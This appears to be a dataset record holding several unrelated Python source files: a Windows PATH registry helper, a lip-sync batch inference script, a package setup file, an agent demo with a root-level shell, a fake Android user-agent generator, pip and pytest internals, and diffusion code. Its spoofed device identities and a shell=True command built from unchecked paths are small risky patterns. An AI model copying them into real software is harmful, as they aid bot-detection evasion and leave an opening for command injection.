    "# (c) Anaconda, Inc. / https://anaconda.com\n# All Rights Reserved\n# This file is under the BSD license\n#\n# Helper script for adding and removing entries in the\n# Windows system path from the NSIS installer.\n\n__all__ = ['remove_from_system_path', 'add_to_system_path',\n           'broadcast_environment_settings_change']\n\nimport ctypes\nimport os\nimport re\nimport sys\nfrom ctypes import wintypes\nfrom os import path\n\nif sys.version_info[0] >= 3:\n    import winreg as reg\nelse:\n    import _winreg as reg\n\n# If pythonw is being run, there may be no write function\nif sys.stdout and sys.stdout.write:\n    out = sys.stdout.write\n    err = sys.stderr.write\nelse:\n    OutputDebugString = ctypes.windll.kernel32.OutputDebugStringW\n    OutputDebugString.argtypes = [ctypes.c_wchar_p]\n\n    def out(x):\n        OutputDebugString('_nsis.py: ' + x)\n\n    def err(x):\n        OutputDebugString('_nsis.py: Error: ' + x)\n\nHWND_BROADCAST = 0xffff\nWM_SETTINGCHANGE = 0x001A\nSMTO_ABORTIFHUNG = 0x0002\nSendMessageTimeout = ctypes.windll.user32.SendMessageTimeoutW\nSendMessageTimeout.restype = None  # wintypes.LRESULT\nSendMessageTimeout.argtypes = [wintypes.HWND, wintypes.UINT, wintypes.WPARAM,\n                               wintypes.LPCWSTR, wintypes.UINT, wintypes.UINT,\n                               ctypes.POINTER(wintypes.DWORD)]\n\n\ndef sz_expand(value, value_type):\n    if value_type == reg.REG_EXPAND_SZ:\n        return reg.ExpandEnvironmentStrings(value)\n    else:\n        return value\n\n\ndef remove_from_system_path(pathname, allusers=True, path_env_var='PATH'):\n    \"\"\"Removes all entries from the path which match the value in 'pathname'\n\n       You must call broadcast_environment_settings_change() after you are finished\n       manipulating the environment with this and other functions.\n\n       For example,\n         # Remove Anaconda from PATH\n         remove_from_system_path('C:\\\\Anaconda')\n         broadcast_environment_settings_change()\n    \"\"\"\n    pathname = path.normcase(path.normpath(pathname))\n\n    envkeys = [(reg.HKEY_CURRENT_USER, r'Environment')]\n    if allusers:\n        envkeys.append((reg.HKEY_LOCAL_MACHINE,\n                        r'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment'))\n    for root, keyname in envkeys:\n        key = reg.OpenKey(root, keyname, 0,\n                          reg.KEY_QUERY_VALUE | reg.KEY_SET_VALUE)\n        reg_value = None\n        try:\n            reg_value = reg.QueryValueEx(key, path_env_var)\n        except WindowsError:\n            # This will happen if we're a non-admin install and the user has\n            # no PATH variable.\n            reg.CloseKey(key)\n            continue\n\n        try:\n            any_change = False\n            results = []\n            for v in reg_value[0].split(os.pathsep):\n                vexp = sz_expand(v, reg_value[1])\n                # Check if the expanded path matches the\n                # requested path in a normalized way\n                if path.normcase(path.normpath(vexp)) == pathname:\n                    any_change = True\n                else:\n                    # Append the original unexpanded version to the results\n                    results.append(v)\n\n            modified_path = os.pathsep.join(results)\n            if any_change:\n                reg.SetValueEx(key, path_env_var, 0, reg_value[1], modified_path)\n        except Exception:\n            # If there's an error (e.g. when there is no PATH for the current\n            # user), continue on to try the next root/keyname pair\n            reg.CloseKey(key)\n\n\ndef add_to_system_path(paths, allusers=True, path_env_var='PATH'):\n    \"\"\"Adds the requested paths to the system PATH variable.\n\n       You must call broadcast_environment_settings_change() after you are finished\n       manipulating the environment with this and other functions.\n\n    \"\"\"\n    # Make sure it's a list\n    if not issubclass(type(paths), list):\n        paths = [paths]\n\n    # Ensure all the paths are valid before we start messing with the\n    # registry.\n    new_paths = None\n    for p in paths:\n        p = path.abspath(p)\n        if new_paths:\n            new_paths = new_paths + os.pathsep + p\n        else:\n            new_paths = p\n\n    if allusers:\n        # All Users\n        root, keyname = (reg.HKEY_LOCAL_MACHINE,\n                         r'SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment')\n    else:\n        # Just Me\n        root, keyname = (reg.HKEY_CURRENT_USER, r'Environment')\n\n    key = reg.OpenKey(root, keyname, 0,\n                      reg.KEY_QUERY_VALUE | reg.KEY_SET_VALUE)\n\n    reg_type = None\n    reg_value = None\n    try:\n        try:\n            reg_value = reg.QueryValueEx(key, path_env_var)\n        except WindowsError:\n            # This will happen if we're a non-admin install and the user has\n            # no PATH variable; in which case, we can write our new paths\n            # directly.\n            reg_type = reg.REG_EXPAND_SZ\n            final_value = new_paths\n        else:\n            # Put to the",
    "# Copyright (c) 2024 Bytedance Ltd. and/or its affiliates\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nimport os\nimport subprocess\nfrom tqdm import tqdm\n\n\ndef inference_video_from_dir(input_dir, output_dir, unet_config_path, ckpt_path):\n    os.makedirs(output_dir, exist_ok=True)\n    video_names = sorted([f for f in os.listdir(input_dir) if f.endswith(\".mp4\")])\n    for video_name in tqdm(video_names):\n        video_path = os.path.join(input_dir, video_name)\n        audio_path = os.path.join(input_dir, video_name.replace(\".mp4\", \"_audio.wav\"))\n        video_out_path = os.path.join(output_dir, video_name.replace(\".mp4\", \"_out.mp4\"))\n        inference_command = f\"python inference.py --unet_config_path {unet_config_path} --video_path {video_path} --audio_path {audio_path} --video_out_path {video_out_path} --inference_ckpt_path {ckpt_path} --seed 1247\"\n        subprocess.run(inference_command, shell=True)\n\n\nif __name__ == \"__main__\":\n    input_dir = \"/mnt/bn/maliva-gen-ai-v2/chunyu.li/HDTF/segmented/cross\"\n    output_dir = \"/mnt/bn/maliva-gen-ai-v2/chunyu.li/HDTF/segmented/latentsync_cross\"\n    unet_config_path = \"configs/unet/unet_latent_16_diffusion.yaml\"\n    ckpt_path = \"output/unet/train-2024_10_08-16:23:43/checkpoints/checkpoint-1920000.pt\"\n\n    inference_video_from_dir(input_dir, output_dir, unet_config_path, ckpt_path)\n",
    "from setuptools import setup, find_packages\nimport os\nimport sys\n\n# Add the package directory to the Python path\nsys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), 'deidentification')))\n\nfrom deidentification_constants import pgmVersion\n\nwith open(\"README.md\", \"r\", encoding=\"utf-8\") as fh:\n    long_description = fh.read()\n\nsetup(\n    name=\"text-deidentification\",\n    version=pgmVersion,\n    author=\"John Taylor\",\n    author_email=\"\",\n    description=\"A Python module for de-identifying personally identifiable information in text\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/jftuga/deidentification\",\n    packages=find_packages(),\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Healthcare Industry\",\n        \"Intended Audience :: Legal Industry\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Programming Language :: Python :: 3.11\",\n        \"Programming Language :: Python :: 3.12\",\n        \"Topic :: Text Processing\",\n        \"Topic :: Security\",\n    ],\n    python_requires=\">=3.10\",\n    install_requires=[\n        \"spacy>=3.8.3,<4.0.0\",\n        \"torch>=2.5.1,<3.0.0\",\n        \"chardet>=5.2.0\",\n        \"veryprettytable>=0.8.1\",\n    ],\n    entry_points={\n        \"console_scripts\": [\n            \"deidentify=deidentification.deidentify:main\",\n        ],\n    },\n)\n",
    "from __future__ import annotations\n\nfrom dotenv import load_dotenv\n\nfrom skyagent.anthropic.anthropic_agent import AnthropicAgent\nfrom skyagent.anthropic.anthropic_tool import AnthropicTool\nfrom skyagent.environment_interactors.unix_shell_environment_adapter import (\n    UnixShellAdapter,\n)\n\n\nload_dotenv(\"/workspaces/SkyAgent/.env\")\n\nshell_adapter = UnixShellAdapter(\n    base_dir=\"/\",\n    log_file_path=\"/workspaces/SkyAgent/examples/working_with_a_shell/handling_interactive_scripts.log\",\n)\n\ntools = [\n    AnthropicTool(tool_function=tool_function)\n    for tool_function in shell_adapter.get_tool_functions()\n]\n\nsystem_prompt = \"\"\"\nYou are an independent senior software engineer with access to a unix shell. \n    - Execute the task given to you. \n    - Avoid using complex chained commands, rather separate them into multiple smaller commands. \n    - Gathering context of your environment is your job. Look around the filesystem, read files whatever you need. \n    - Ensuring that your commands worked is your responsibility. Use additional commands to verify that your commands worked, and had their required effect.\n\"\"\"\n\n\nwith shell_adapter:\n    agent = AnthropicAgent(\n        name=\"Unix Shell\",\n        model=\"claude-3-5-sonnet-latest\",\n        system_prompt=system_prompt,\n        tools=tools,\n        enable_live_display=True,\n        max_turns=50,\n    )\n\n    result = agent.call_agent(\n        query=\"\"\"\n    There is a a bash script somewhere int the /workspaces/SkyAgent/examples directory that prints a secret message when you run it. \n    Your job is to tell me this secret message, and how it changed your world view.\n    Please give a short summary of your adventure executing this task.\n    \"\"\"\n    )\n",
    "import requests\r\nfrom bs4 import BeautifulSoup\r\nimport random\r\nimport uuid\r\n\r\n# \u0421\u043f\u0438\u0441\u043e\u043a \u0432\u0435\u0440\u0441\u0438\u0439 Android\r\nandroid_versions = [\"8.0\", \"9.0\", \"10\", \"11\", \"12\", \"13\", \"14\"]\r\n\r\n# \u041c\u0438\u043d\u0438\u043c\u0430\u043b\u044c\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f Android \u0434\u043b\u044f \u0443\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0438 Telegram\r\nmin_android_version = 4.1\r\n\r\n# \u0421\u043f\u0438\u0441\u043e\u043a \u0431\u0440\u0430\u0443\u0437\u0435\u0440\u043e\u0432 \u0441 \u0432\u043e\u0437\u043c\u043e\u0436\u043d\u044b\u043c\u0438 \u0432\u0435\u0440\u0441\u0438\u044f\u043c\u0438\r\nbrowsers = {\r\n    \"Chrome\": [\"91.0.4472.124\", \"92.0.4515.131\", \"93.0.4577.82\", \"94.0.4606.81\", \"95.0.4638.50\"],\r\n    \"Firefox\": [\"89.0\", \"90.0\", \"91.0\", \"92.0\", \"93.0\"],\r\n    \"Opera\": [\"75.0.3969.143\", \"76.0.4017.177\", \"77.0.4053.118\", \"78.0.4093.192\"],\r\n    \"Samsung Browser\": [\"14.0\", \"15.0\", \"16.0\"],\r\n    \"Safari\": [\"14.0\", \"15.0\", \"16.0\"],\r\n    \"UC Browser\": [\"12.0\", \"13.0\", \"14.0\"],\r\n    \"Microsoft Edge\": [\"91.0\", \"92.0\", \"93.0\"],\r\n    \"Brave\": [\"1.32.113\", \"1.33.74\"],\r\n    \"Vivaldi\": [\"4.1.2369\", \"4.2.2702\"]\r\n}\r\n\r\n# \u0421\u043f\u0438\u0441\u043e\u043a \u0440\u0435\u043d\u0434\u0435\u0440\u0438\u043d\u0433 \u0434\u0432\u0438\u0436\u043a\u043e\u0432\r\nrender_engines = [\"AppleWebKit\", \"Blink\", \"Gecko\", \"Presto\"]\r\n\r\n# \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0437\u0430\u0433\u043e\u043b\u043e\u0432\u043a\u0438 \u0434\u043b\u044f \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u0438\r\naccept_languages = [\"en-US\", \"ru-RU\", \"de-DE\", \"fr-FR\", \"es-ES\"]\r\naccept_encodings = [\"gzip\", \"deflate\", \"br\", \"identity\"]\r\nconnections = [\"keep-alive\", \"close\"]\r\n\r\n# \u0421\u043f\u0438\u0441\u043e\u043a \u0430\u0440\u0445\u0438\u0442\u0435\u043a\u0442\u0443\u0440\r\narchitectures = [\"arm64\", \"armeabi-v7a\", \"x86_64\"]\r\n\r\n# \u041f\u0440\u0438\u043c\u0435\u0440 \u0440\u0443\u0447\u043d\u043e\u0433\u043e \u0441\u043f\u0438\u0441\u043a\u0430 \u043c\u043e\u0434\u0435\u043b\u0435\u0439 Android\r\nandroid_models = [\r\n    \"Samsung Galaxy S21\", \"Google Pixel 5\", \"OnePlus 9\", \"Xiaomi Mi 11\", \"Huawei P40\", \r\n    \"Sony Xperia 5 II\", \"Motorola Moto G Power\", \"LG Velvet\", \"Asus Zenfone 7\", \r\n    \"Realme X50\", \"Oppo Reno 4\", \"Nokia 8.3\", \"Honor 30 Pro\", \"Vivo V20\"\r\n]\r\n\r\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0438, \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0435\u0442 \u043b\u0438 \u043c\u043e\u0434\u0435\u043b\u044c Telegram\r\ndef supports_telegram(version):\r\n    try:\r\n        version_float = float(version)\r\n    except ValueError:\r\n        print(f\"\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f Android: {version}\")\r\n        return False\r\n\r\n    version_numbers = [int(x) for x in str(version_float).split('.')]\r\n    min_version_numbers = [int(x) for x in str(min_android_version).split('.')]\r\n    \r\n    if version_numbers[0] > min_version_numbers[0]:\r\n        return True\r\n    elif version_numbers[0] == min_version_numbers[0] and version_numbers[1] >= min_version_numbers[1]:\r\n        return True\r\n    return False\r\n\r\n# \u0424\u0443\u043d\u043a\u0446\u0438\u044f \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 User-Agent \u0441\u0442\u0440\u043e\u043a\r\ndef generate_user_agents(android_versions, android_models, browsers, render_engines, count):\r\n    user_agents = set()  # \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e \u0434\u043b\u044f \u0445\u0440\u0430\u043d\u0435\u043d\u0438\u044f \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 \u0441\u0442\u0440\u043e\u043a\r\n\r\n    # \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f Android User-Agents\r\n    while len(user_agents) < count:\r\n        model = random.choice(android_models)\r\n        version = random.choice(android_versions)\r\n\r\n        # \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u043a\u0443 Telegram\r\n        if not supports_telegram(version):\r\n            continue  # \u041f\u0440\u043e\u043f\u0443\u0441\u043a\u0430\u0435\u043c \u043c\u043e\u0434\u0435\u043b\u0438, \u043a\u043e\u0442\u043e\u0440\u044b\u0435 \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0442 Telegram\r\n\r\n        # \u0412\u044b\u0431\u0438\u0440\u0430\u0435\u043c \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0439 \u0431\u0440\u0430\u0443\u0437\u0435\u0440 \u0438 \u0435\u0433\u043e \u0432\u0435\u0440\u0441\u0438\u044e\r\n        browser_name = random.choice(list(browsers.keys()))\r\n        browser_version = random.choice(browsers[browser_name])\r\n\r\n        # \u0412\u044b\u0431\u0438\u0440\u0430\u0435\u043c \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0439 \u0440\u0435\u043d\u0434\u0435\u0440\u0438\u043d\u0433 \u0434\u0432\u0438\u0436\u043e\u043a\r\n        render_engine = random.choice(render_engines)\r\n\r\n        # \u0414\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0435 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0435 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u044b\r\n        language = random.choice(accept_languages)\r\n        encoding = random.choice(accept_encodings)\r\n        connection = random.choice(connections)\r\n        architecture = random.choice(architectures)\r\n        device_id = uuid.uuid4()\r\n\r\n        # \u0424\u043e\u0440\u043c\u0438\u0440\u0443\u0435\u043c User-Agent\r\n        user_agent = (f\"Mozilla/5.0 (Linux; Android {version}; {model} Build/XYZ; {architecture}) \"\r\n                      f\"{render_engine}/537.36 (KHTML, like Gecko) {browser_name}/{browser_version} \"\r\n                      f\"Mobile Safari/537.36 Accept-Language: {language} Accept-Encoding: {encoding} \"\r\n                      f\"Connection: {connection} Device-ID: {device_id}\")\r\n\r\n        # \u041f\u0440\u043e\u0432\u0435\u0440\u044f\u0435\u043c \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u043e\u0441\u0442\u044c \u0438 \u0434\u043e\u0431\u0430\u0432\u043b\u044f\u0435\u043c \u0432 \u043c\u043d\u043e\u0436\u0435\u0441\u0442\u0432\u043e\r\n        if user_agent not in user_agents:\r\n            user_agents.add(user_agent)\r\n\r\n    # \u0412\u043e\u0437\u0432\u0440\u0430\u0449\u0430\u0435\u043c \u0432\u0441\u0435 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0435 User-Agent'\u044b\r\n    return list(user_agents)\r\n\r\n# \u0417\u0430\u043f\u0440\u043e\u0441 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 User-Agent'\u043e\u0432\r\ncount = int(input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e User-Agent'\u043e\u0432 \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0438: \"))\r\n\r\n# \u0413\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u044f \u0443\u043a\u0430\u0437\u0430\u043d\u043d\u043e\u0433\u043e \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u0430 \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 User-Agent'\u043e\u0432 \u0434\u043b\u044f Android, \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0449\u0438\u0445 Telegram\r\ngenerated_user_agents = generate_user_agents(\r\n    android_versions=[\"8.0\", \"9.0\", \"10\", \"11\", \"12\", \"13\", \"14\"],\r\n    android_models=android_models,\r\n    browsers=browsers,\r\n    render_engines=render_engines,\r\n    count=count\r\n)\r\n\r\n# \u0417\u0430\u043f\u0438\u0441\u044c \u0440\u0435\u0437\u0443\u043b\u044c\u0442\u0430\u0442\u0430 \u0432 \u0444\u0430\u0439\u043b \u0441 \u043f\u0440\u043e\u0431\u0435\u043b\u0430\u043c\u0438 \u043c\u0435\u0436\u0434\u0443 User-Agent'\u0430\u043c\u0438\r\nfile_name = f'android_user_agents_with_telegram_support_{count}.txt'\r\nwith open(file_name, 'w') as file:\r\n    for agent in generated_user_agents:\r\n        file.write(agent + '\\n\\n')  # \u041a\u0430\u0436\u0434\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 \u0441 \u043d\u043e\u0432\u043e\u0439 \u0441\u0442\u0440\u043e\u043a\u0438 \u0438 \u043f\u0440\u043e\u0431\u0435\u043b\u043e\u043c \u043c\u0435\u0436\u0434\u0443 \u043d\u0438\u043c\u0438\r\n\r\nprint(f\"{len(generated_user_agents)} \u0443\u043d\u0438\u043a\u0430\u043b\u044c\u043d\u044b\u0445 Android User-Agent'\u043e\u0432, \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u044e\u0449\u0438\u0445 Telegram, \u0431\u044b\u043b\u0438 \u0443\u0441\u043f\u0435\u0448\u043d\u043e \u0441\u0433\u0435\u043d\u0435\u0440\u0438\u0440\u043e\u0432\u0430\u043d\u044b \u0438 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u044b \u0432 \u0444\u0430\u0439\u043b {file_name}.\")",
    "\"\"\"Generate and work with PEP 425 Compatibility Tags.\n\"\"\"\n\nimport re\nfrom typing import List, Optional, Tuple\n\nfrom pip._vendor.packaging.tags import (\n    PythonVersion,\n    Tag,\n    compatible_tags,\n    cpython_tags,\n    generic_tags,\n    interpreter_name,\n    interpreter_version,\n    mac_platforms,\n)\n\n_osx_arch_pat = re.compile(r\"(.+)_(\\d+)_(\\d+)_(.+)\")\n\n\ndef version_info_to_nodot(version_info: Tuple[int, ...]) -> str:\n    # Only use up to the first two numbers.\n    return \"\".join(map(str, version_info[:2]))\n\n\ndef _mac_platforms(arch: str) -> List[str]:\n    match = _osx_arch_pat.match(arch)\n    if match:\n        name, major, minor, actual_arch = match.groups()\n        mac_version = (int(major), int(minor))\n        arches = [\n            # Since we have always only checked that the platform starts\n            # with \"macosx\", for backwards-compatibility we extract the\n            # actual prefix provided by the user in case they provided\n            # something like \"macosxcustom_\". It may be good to remove\n            # this as undocumented or deprecate it in the future.\n            \"{}_{}\".format(name, arch[len(\"macosx_\") :])\n            for arch in mac_platforms(mac_version, actual_arch)\n        ]\n    else:\n        # arch pattern didn't match (?!)\n        arches = [arch]\n    return arches\n\n\ndef _custom_manylinux_platforms(arch: str) -> List[str]:\n    arches = [arch]\n    arch_prefix, arch_sep, arch_suffix = arch.partition(\"_\")\n    if arch_prefix == \"manylinux2014\":\n        # manylinux1/manylinux2010 wheels run on most manylinux2014 systems\n        # with the exception of wheels depending on ncurses. PEP 599 states\n        # manylinux1/manylinux2010 wheels should be considered\n        # manylinux2014 wheels:\n        # https://www.python.org/dev/peps/pep-0599/#backwards-compatibility-with-manylinux2010-wheels\n        if arch_suffix in {\"i686\", \"x86_64\"}:\n            arches.append(\"manylinux2010\" + arch_sep + arch_suffix)\n            arches.append(\"manylinux1\" + arch_sep + arch_suffix)\n    elif arch_prefix == \"manylinux2010\":\n        # manylinux1 wheels run on most manylinux2010 systems with the\n        # exception of wheels depending on ncurses. PEP 571 states\n        # manylinux1 wheels should be considered manylinux2010 wheels:\n        # https://www.python.org/dev/peps/pep-0571/#backwards-compatibility-with-manylinux1-wheels\n        arches.append(\"manylinux1\" + arch_sep + arch_suffix)\n    return arches\n\n\ndef _get_custom_platforms(arch: str) -> List[str]:\n    arch_prefix, arch_sep, arch_suffix = arch.partition(\"_\")\n    if arch.startswith(\"macosx\"):\n        arches = _mac_platforms(arch)\n    elif arch_prefix in [\"manylinux2014\", \"manylinux2010\"]:\n        arches = _custom_manylinux_platforms(arch)\n    else:\n        arches = [arch]\n    return arches\n\n\ndef _expand_allowed_platforms(platforms: Optional[List[str]]) -> Optional[List[str]]:\n    if not platforms:\n        return None\n\n    seen = set()\n    result = []\n\n    for p in platforms:\n        if p in seen:\n            continue\n        additions = [c for c in _get_custom_platforms(p) if c not in seen]\n        seen.update(additions)\n        result.extend(additions)\n\n    return result\n\n\ndef _get_python_version(version: str) -> PythonVersion:\n    if len(version) > 1:\n        return int(version[0]), int(version[1:])\n    else:\n        return (int(version[0]),)\n\n\ndef _get_custom_interpreter(\n    implementation: Optional[str] = None, version: Optional[str] = None\n) -> str:\n    if implementation is None:\n        implementation = interpreter_name()\n    if version is None:\n        version = interpreter_version()\n    return f\"{implementation}{version}\"\n\n\ndef get_supported(\n    version: Optional[str] = None,\n    platforms: Optional[List[str]] = None,\n    impl: Optional[str] = None,\n    abis: Optional[List[str]] = None,\n) -> List[Tag]:\n    \"\"\"Return a list of supported tags for each version specified in\n    `versions`.\n\n    :param version: a string version, of the form \"33\" or \"32\",\n        or None. The version will be assumed to support our ABI.\n    :param platform: specify a list of platforms you want valid\n        tags for, or None. If None, use the local system platform.\n    :param impl: specify the exact implementation you want valid\n        tags for, or None. If None, use the local interpreter impl.\n    :param abis: specify a list of abis you want valid\n        tags for, or None. If None, use the local interpreter abi.\n    \"\"\"\n    supported: List[Tag] = []\n\n    python_version: Optional[PythonVersion] = None\n    if version is not None:\n        python_version = _get_python_version(version)\n\n    interpreter = _get_custom_interpreter(impl, version)\n\n    platforms = _expand_allowed_platforms(platforms)\n\n    is_cpython = (impl or interpreter_name()) == \"cp\"\n    if is_cpython:\n        supported.extend(\n            cpython_tags(\n                python_version=python_version,\n                abis=abis,\n                platforms=platforms,\n            )\n        )\n    else:\n  ",
    "\"\"\"Helper plugin for pytester; should not be loaded on its own.\"\"\"\n# This plugin contains assertions used by pytester. pytester cannot\n# contain them itself, since it is imported by the `pytest` module,\n# hence cannot be subject to assertion rewriting, which requires a\n# module to not be already imported.\nfrom typing import Dict\nfrom typing import Optional\nfrom typing import Sequence\nfrom typing import Tuple\nfrom typing import Union\n\nfrom _pytest.reports import CollectReport\nfrom _pytest.reports import TestReport\n\n\ndef assertoutcome(\n    outcomes: Tuple[\n        Sequence[TestReport],\n        Sequence[Union[CollectReport, TestReport]],\n        Sequence[Union[CollectReport, TestReport]],\n    ],\n    passed: int = 0,\n    skipped: int = 0,\n    failed: int = 0,\n) -> None:\n    __tracebackhide__ = True\n\n    realpassed, realskipped, realfailed = outcomes\n    obtained = {\n        \"passed\": len(realpassed),\n        \"skipped\": len(realskipped),\n        \"failed\": len(realfailed),\n    }\n    expected = {\"passed\": passed, \"skipped\": skipped, \"failed\": failed}\n    assert obtained == expected, outcomes\n\n\ndef assert_outcomes(\n    outcomes: Dict[str, int],\n    passed: int = 0,\n    skipped: int = 0,\n    failed: int = 0,\n    errors: int = 0,\n    xpassed: int = 0,\n    xfailed: int = 0,\n    warnings: Optional[int] = None,\n    deselected: Optional[int] = None,\n) -> None:\n    \"\"\"Assert that the specified outcomes appear with the respective\n    numbers (0 means it didn't occur) in the text output from a test run.\"\"\"\n    __tracebackhide__ = True\n\n    obtained = {\n        \"passed\": outcomes.get(\"passed\", 0),\n        \"skipped\": outcomes.get(\"skipped\", 0),\n        \"failed\": outcomes.get(\"failed\", 0),\n        \"errors\": outcomes.get(\"errors\", 0),\n        \"xpassed\": outcomes.get(\"xpassed\", 0),\n        \"xfailed\": outcomes.get(\"xfailed\", 0),\n    }\n    expected = {\n        \"passed\": passed,\n        \"skipped\": skipped,\n        \"failed\": failed,\n        \"errors\": errors,\n        \"xpassed\": xpassed,\n        \"xfailed\": xfailed,\n    }\n    if warnings is not None:\n        obtained[\"warnings\"] = outcomes.get(\"warnings\", 0)\n        expected[\"warnings\"] = warnings\n    if deselected is not None:\n        obtained[\"deselected\"] = outcomes.get(\"deselected\", 0)\n        expected[\"deselected\"] = deselected\n    assert obtained == expected\n",
    "import torch as th\nimport numpy as np\nimport logging\n\nimport enum\n\nfrom . import path\nfrom .utils import EasyDict, log_state, mean_flat\nfrom .integrators import ode, sde\nfrom scipy.stats import norm\n\nclass ModelType(enum.Enum):\n    \"\"\"\n    Which type of output the model predicts.\n    \"\"\"\n\n    NOISE = enum.auto()  # the model predicts epsilon\n    SCORE = enum.auto()  # the model predicts \\nabla \\log p(x)\n    VELOCITY = enum.auto()  # the model predicts v(x)\n\nclass PathType(enum.Enum):\n    \"\"\"\n    Which type of path to use.\n    \"\"\"\n\n    LINEAR = enum.auto()\n    GVP = enum.auto()\n    VP = enum.auto()\n\nclass WeightType(enum.Enum):\n    \"\"\"\n    Which type of weighting to use.\n    \"\"\"\n\n    NONE = enum.auto()\n    VELOCITY = enum.auto()\n    LIKELIHOOD = enum.auto()\n\n\nclass Transport:\n\n    def __init__(\n        self,\n        *,\n        model_type,\n        path_type,\n        loss_type,\n        train_eps,\n        sample_eps,\n        use_cosine_loss=False,\n        use_lognorm=False,\n        partitial_train=None,\n        partial_ratio=1.0,\n        shift_lg=False,\n    ):\n        path_options = {\n            PathType.LINEAR: path.ICPlan,\n            PathType.GVP: path.GVPCPlan,\n            PathType.VP: path.VPCPlan,\n        }\n\n        self.loss_type = loss_type\n        self.model_type = model_type\n        self.path_sampler = path_options[path_type]()\n        self.train_eps = train_eps\n        self.sample_eps = sample_eps\n        self.use_cosine_loss = use_cosine_loss\n        self.use_lognorm = use_lognorm\n        self.partitial_train = partitial_train\n        self.partial_ratio = partial_ratio\n        self.shift_lg = shift_lg\n\n    def prior_logp(self, z):\n        '''\n            Standard multivariate normal prior\n            Assume z is batched\n        '''\n        shape = th.tensor(z.size())\n        N = th.prod(shape[1:])\n        _fn = lambda x: -N / 2. * np.log(2 * np.pi) - th.sum(x ** 2) / 2.\n        return th.vmap(_fn)(z)\n    \n\n    def check_interval(\n        self, \n        train_eps, \n        sample_eps, \n        *, \n        diffusion_form=\"SBDM\",\n        sde=False, \n        reverse=False, \n        eval=False,\n        last_step_size=0.0,\n    ):\n        t0 = 0\n        t1 = 1\n        eps = train_eps if not eval else sample_eps\n        if (type(self.path_sampler) in [path.VPCPlan]):\n\n            t1 = 1 - eps if (not sde or last_step_size == 0) else 1 - last_step_size\n\n        elif (type(self.path_sampler) in [path.ICPlan, path.GVPCPlan]) \\\n            and (self.model_type != ModelType.VELOCITY or sde): # avoid numerical issue by taking a first semi-implicit step\n\n            t0 = eps if (diffusion_form == \"SBDM\" and sde) or self.model_type != ModelType.VELOCITY else 0\n            t1 = 1 - eps if (not sde or last_step_size == 0) else 1 - last_step_size\n        \n        if reverse:\n            t0, t1 = 1 - t0, 1 - t1\n\n        return t0, t1\n\n    def sample_logit_normal(self, mu, sigma, size=1):\n        # Generate samples from the normal distribution\n        samples = norm.rvs(loc=mu, scale=sigma, size=size)\n        \n        # Transform samples to be in the range (0, 1) using the logistic function\n        samples = 1 / (1 + np.exp(-samples))\n\n        # Numpy to Tensor\n        samples = th.tensor(samples, dtype=th.float32)\n\n        return samples\n\n    def sample_in_range(self, mu, sigma, target_size, range_min=0, range_max=0.5):\n        samples = []\n        while len(samples) < target_size:\n            generated_samples = self.sample_logit_normal(mu, sigma, size=target_size)\n            filtered_samples = generated_samples[(generated_samples >= range_min) & (generated_samples <= range_max)]\n            samples.extend(filtered_samples)\n        \n        # If we have more than the target size, 